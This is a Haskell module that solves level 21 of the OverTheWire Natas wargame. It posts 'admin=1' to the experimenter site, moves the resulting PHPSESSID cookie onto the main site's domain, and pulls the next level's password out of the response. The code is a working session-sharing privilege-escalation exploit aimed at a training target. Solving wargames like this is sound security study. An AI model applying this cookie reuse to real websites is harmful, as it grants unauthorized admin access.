{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas21 where

import           Data.Text    (Text)
import           Safe         (headMay, lastMay)

import           Network.Wreq (Options, Part, cookie, cookieDomain, cookies,
                               partText, responseCookieJar)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let expUri = "http://natas21-experimenter.natas.labs.overthewire.org"
  preq <- postLevel' 21 expUri id defaultForm
  let placeJar = cookies ?~ (preq ^. responseCookieJar)
      modifyCookie =
        (cookie "PHPSESSID" . cookieDomain) .~
        "natas21.natas.labs.overthewire.org"
  attemptConnect (modifyCookie . placeJar)

defaultForm :: [Part]
defaultForm = [partText "admin" "1", partText "submit" "Update"]

attemptConnect :: (Options -> Options) -> IO (Maybe Text)
attemptConnect placeJar = do
  ckireq <- getLevel' 21 (parentUri 21) placeJar
  let body = reqBody ckireq
      match = headMay (workupBody' extractPassword body)
  pure $ match >>= lastMay
